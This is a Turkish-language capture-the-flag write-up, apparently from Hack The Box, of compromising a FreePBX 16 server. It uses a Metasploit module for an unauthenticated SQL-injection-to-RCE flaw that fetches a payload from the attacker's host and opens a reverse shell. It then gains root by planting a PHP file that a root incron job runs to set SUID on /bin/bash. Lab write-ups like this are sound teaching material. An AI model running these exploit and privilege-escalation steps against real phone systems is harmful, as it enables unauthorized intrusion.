@@ -1,0 +1,148 @@
+nmap ile baslıyorum, her zamanki gibi önce hızlı port taraması:
+
+    nmap -sC -sV -p- --min-rate 5000 -oA full_scan 10.129.59.57
+
+Açık portlar:
+  - 22/tcp  -> OpenSSH 7.4
+  - 80/tcp  -> Apache 2.4.6 (CentOS), redirect -> http://connected.htb/
+  - 443/tcp -> SSL/HTTPS, cert CN=pbxconnect
+
+/etc/hosts'a ekliyorum:
+    echo "10.129.59.57 connected.htb" >> /etc/hosts
+
+Port 80'e gittiğimde FreePBX admin paneli karşılıyor. Versiyon footer'da yazıyor:
+    FreePBX 16.0.40.7
+
+
+[ Web Enumeration ]
+
+Sayfa kaynağını açtığımda ilginç bir şey dikkatimi çekiyor. Sayfanın alt kısmında
+beyaz renkle yazılmış (görünmez) bir div var:
+
+    <div id="key" style="color: white;font-size:small">
+        ickidutqd2e9tlm8r5ktetehl6
+    </div>
+
+Bu kesinlikle kasıtlı bir şekilde bırakılmış. Bir credential olabilir, bir yerde
+kullanılacak. Not alıyorum.
+
+robots.txt bakıyorum, sadece standart FreePBX robots mesajı. Gobuster ile dizin
+taraması yapıyorum ama /admin dışında işe yarar bir şey çıkmıyor.
+
+SSL sertifikasında commonName=pbxconnect yazıyor. Subdomain olabilir diye
+/etc/hosts'a ekliyorum ama aynı sayfa açılıyor.
+
+
+[ Vulnerability Research ]
+
+FreePBX 16.0.40.7 için CVE arıyorum. CVE-2025-57819 çıkıyor:
+unauthenticated SQL injection -> RCE. Hedef versiyon da etkilenen range içinde.
+
+Metasploit'te modülü var:
+    exploit/unix/http/freepbx_unauth_sqli_to_rce
+
+
+[ Initial Access ]
+
+Modülü yüklüyorum ve ayarları yapıyorum:
+
+    use exploit/unix/http/freepbx_unauth_sqli_to_rce
+    set RHOSTS 10.129.59.57
+    set VHOST connected.htb
+    set LHOST tun0
+    set FETCH_SRVHOST 10.10.16.75
+    run
+
+İlk birkaç denemede cronjob oluşturuluyor ama session gelmiyor. Neden?
+Payload HTB VPN üzerinden geçemiyor. MTU sorunu klasik bir problem, tun0
+arayüzünün MTU değerini düşürmek gerekiyor:
+
+    sudo ip link set dev tun0 mtu 1200
+
+MTU'yu düşürdükten sonra exploit düzgün çalışıyor, asterisk kullanıcısı olarak
+reverse shell geldi.
+
+    uid=999(asterisk) gid=1000(asterisk)
+
+
+[ User Flag ]
+
+    *
+[ Privilege Escalation ]
+
+ps aux'a bakıyorum, incrond root olarak çalışıyor:
+
+    root  753  /usr/sbin/incrond
+
+incron tablolarına bakıyorum:
+
+    cat /etc/incron.d/*
+
+İki kritik satır göze çarpıyor:
+
+    /usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
+    /usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
+
+ha_trigger dosyasına yazılınca root olarak /usr/sbin/sysadmin_ha çalışıyor.
+Bu iki dosyanın izinleri neymiş:
+
+    ls -la /usr/local/asterisk/
+    rwxrwxrwx ha_trigger
+    rwxrwxrwx incron/
+
+Her ikisi de world-writable. Güzel.
+
+sysadmin_ha betiğini okuyorum:
+
+    cat /usr/sbin/sysadmin_ha
+
+Şunu yapıyor:
+    1. /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php dosyası varsa yükle
+    2. incron sınıfını oluştur
+    3. rootTrigger() metodunu çağır
+
+Ve /var/www/html/admin/modules/ dizini asterisk kullanıcısına ait, yazma yetkimiz var.
+freepbx_ha modülü sistemde yok, biz yaratacağız.
+
+Exploit adımları:
+
+    # Dizinleri oluştur
+    mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc
+
+    # Malicious incron.php yaz
+    cat > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php << 'EOF'
+    <?php
+    class incron {
+        public function rootTrigger() {
+            exec("chmod u+s /bin/bash");
+        }
+    }
+    EOF
+
+    # ha_trigger'ı tetikle
+    echo "pwn" > /usr/local/asterisk/ha_trigger
+
+    # Birkaç saniye sonra kontrol et
+    sleep 3
+    ls -la /bin/bash
+    # -rwsr-xr-x -> SUID set edildi
+
+    # Root shell
+    /bin/bash -p
+    id
+    # uid=999(asterisk) gid=1000(asterisk) euid=0(root)
+
+
+[ Root Flag ]
+
+    /bin/bash -p -c "cat /root/root.txt"
+
+
+[ Notlar ]
+
+- HTML kaynağındaki "key" değeri bu makinede doğrudan kullanılmadı ama
+  dikkat çekici bir detay, bu tür CTF'lerde credential hint olarak bırakılıyor.
+
+- MTU sorunu HTB'de çok sık karşılaşılan bir şey. Staged payload çalışmıyorsa
+  ve SQLi düzgün tetikleniyorsa ilk bakılacak yer tun0 MTU değeri.
+  Fix: sudo ip link set dev tun0 mtu 1200
